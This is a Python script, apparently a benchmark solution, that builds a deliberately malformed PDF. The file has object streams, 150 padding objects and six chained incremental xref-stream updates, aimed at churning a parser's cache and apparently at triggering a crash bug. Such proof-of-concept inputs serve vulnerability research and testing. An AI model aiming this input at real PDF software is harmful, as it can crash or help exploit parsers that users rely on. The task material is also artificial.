import os
import zlib
from typing import List, Tuple, Optional


def _u_be(n: int, size: int) -> bytes:
    return int(n).to_bytes(size, "big", signed=False)


def _flate(data: bytes, level: int = 9) -> bytes:
    return zlib.compress(data, level)


def _pdf_obj(objnum: int, gen: int, body: bytes) -> bytes:
    return (f"{objnum} {gen} obj\n").encode("ascii") + body + b"\nendobj\n"


def _pdf_stream_dict(entries: List[Tuple[str, str]]) -> bytes:
    # entries values are already valid PDF tokens/strings
    items = [f"/{k} {v}" for k, v in entries]
    return ("<< " + " ".join(items) + " >>").encode("ascii")


def _pdf_stream_obj(objnum: int, gen: int, dict_entries: List[Tuple[str, str]], stream_data: bytes) -> bytes:
    d = _pdf_stream_dict(dict_entries)
    return _pdf_obj(
        objnum,
        gen,
        d + b"\nstream\n" + stream_data + b"\nendstream",
    )


def _make_objstm(objnum: int, objects: List[Tuple[int, bytes]], compress: bool = True) -> bytes:
    # objects are (objid, object_representation_bytes) and must NOT be stream objects
    # Build index table and object data with '\n' separators
    obj_datas = []
    offsets = []
    cur = 0
    for _, ob in objects:
        offsets.append(cur)
        obj_datas.append(ob)
        cur += len(ob) + 1  # newline after each object
    obj_data = b"\n".join(obj_datas) + b"\n"

    # Index part: "id offset id offset ...\n"
    idx_tokens = []
    for (objid, _), off in zip(objects, offsets):
        idx_tokens.append(str(objid).encode("ascii"))
        idx_tokens.append(str(off).encode("ascii"))
    index_part = b" ".join(idx_tokens) + b"\n"
    first = len(index_part)
    n = len(objects)

    decoded = index_part + obj_data
    if compress:
        encoded = _flate(decoded, 9)
        dict_entries = [
            ("Type", "/ObjStm"),
            ("N", str(n)),
            ("First", str(first)),
            ("Filter", "/FlateDecode"),
            ("Length", str(len(encoded))),
        ]
        stream_data = encoded
    else:
        dict_entries = [
            ("Type", "/ObjStm"),
            ("N", str(n)),
            ("First", str(first)),
            ("Length", str(len(decoded))),
        ]
        stream_data = decoded

    return _pdf_stream_obj(objnum, 0, dict_entries, stream_data)


def _make_xref_entries(size: int, obj5_offset: int, obj4_num: int, obj7_num: int, dummy_first_obj: int, dummy_count: int,
                       offset_obj4: int, offset_obj6: int, offset_obj7: int) -> List[Tuple[int, int, int]]:
    # Entry tuple: (type, field2, field3)
    entries: List[Tuple[int, int, int]] = [(0, 0, 65535)]  # obj 0
    # obj 1-3 in objstm 4 indices 0..2
    entries.append((2, obj4_num, 0))  # 1
    entries.append((2, obj4_num, 1))  # 2
    entries.append((2, obj4_num, 2))  # 3
    # obj 4 uncompressed
    entries.append((1, offset_obj4, 0))  # 4
    # obj 5 xref stream itself
    entries.append((1, obj5_offset, 0))  # 5
    # obj 6 content stream
    entries.append((1, offset_obj6, 0))  # 6
    # obj 7 objstm 7
    entries.append((1, offset_obj7, 0))  # 7

    # dummy objects in objstm 7
    for i in range(dummy_count):
        objid = dummy_first_obj + i
        idx = i
        # Fill any gaps if size extends beyond expected; we'll fill later if needed
        entries.append((2, obj7_num, idx))  # for objid sequentially

    # Ensure entries length = size
    if len(entries) < size:
        # fill remaining as free (shouldn't happen with our chosen layout)
        for _ in range(size - len(entries)):
            entries.append((0, 0, 65535))
    elif len(entries) > size:
        entries = entries[:size]
    return entries


def _make_xref_stream(objnum: int, size: int, entries: List[Tuple[int, int, int]], root_obj: int, prev_offset: Optional[int]) -> bytes:
    # W [1 4 2]
    raw = bytearray()
    for t, f2, f3 in entries:
        raw += _u_be(t, 1)
        raw += _u_be(f2, 4)
        raw += _u_be(f3, 2)
    decoded = bytes(raw)
    encoded = _flate(decoded, 9)

    dict_entries = [
        ("Type", "/XRef"),
        ("Size", str(size)),
        ("W", "[1 4 2]"),
        ("Index", f"[0 {size}]"),
        ("Root", f"{root_obj} 0 R"),
        ("Filter", "/FlateDecode"),
        ("Length", str(len(encoded))),
    ]
    if prev_offset is not None:
        dict_entries.insert(5, ("Prev", str(prev_offset)))
    return _pdf_stream_obj(objnum, 0, dict_entries, encoded)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a compact but aggressive incremental-update PDF with repeated xref streams (/Prev chain),
        # object streams, and many compressible objects to increase cache churn.
        dummy_count = 150
        dummy_first_obj = 8
        obj4_num = 4
        obj5_num = 5
        obj6_num = 6
        obj7_num = 7
        max_obj = dummy_first_obj + dummy_count - 1
        size = max_obj + 1

        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

        # ObjStm 4 contains objects 1-3: Catalog, Pages, Page (no streams inside)
        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 6 0 R /Resources <<>> >>"
        obj4_bytes = _make_objstm(obj4_num, [(1, obj1), (2, obj2), (3, obj3)], compress=True)

        # ObjStm 7 contains many dummy objects 8..max_obj
        dummy_objs: List[Tuple[int, bytes]] = []
        for i in range(dummy_count):
            objid = dummy_first_obj + i
            # Mix of small dict/array/integer to vary parsing paths while remaining non-streams
            if i % 3 == 0:
                dummy_objs.append((objid, f"<< /K {objid} /V {i} /S /Name{objid} >>".encode("ascii")))
            elif i % 3 == 1:
                dummy_objs.append((objid, f"[{i} {objid} ({objid}) /N{objid}]".encode("ascii")))
            else:
                dummy_objs.append((objid, str(objid * 17 + i).encode("ascii")))
        obj7_bytes = _make_objstm(obj7_num, dummy_objs, compress=True)

        # Content stream object 6
        content = b"q\nQ\n"
        obj6_dict = [("Length", str(len(content)))]
        obj6_bytes = _pdf_stream_obj(obj6_num, 0, obj6_dict, content)

        # Build base file with objects 4,7,6
        out = bytearray()
        out += header

        offset_obj4 = len(out)
        out += obj4_bytes
        offset_obj7 = len(out)
        out += obj7_bytes
        offset_obj6 = len(out)
        out += obj6_bytes

        # Append multiple incremental xref updates redefining object 5 each time
        prev_xref_offset: Optional[int] = None
        revisions = 6
        for rev in range(revisions):
            # Ensure separation from prior EOF
            if len(out) > 0 and out[-1:] != b"\n":
                out += b"\n"

            xref_offset = len(out)

            # Create xref entries with current xref's own offset for object 5
            entries = _make_xref_entries(
                size=size,
                obj5_offset=xref_offset,
                obj4_num=obj4_num,
                obj7_num=obj7_num,
                dummy_first_obj=dummy_first_obj,
                dummy_count=dummy_count,
                offset_obj4=offset_obj4,
                offset_obj6=offset_obj6,
                offset_obj7=offset_obj7,
            )

            xref_bytes = _make_xref_stream(
                objnum=obj5_num,
                size=size,
                entries=entries,
                root_obj=1,
                prev_offset=prev_xref_offset,
            )
            out += xref_bytes
            out += b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"

            prev_xref_offset = xref_offset

        return bytes(out)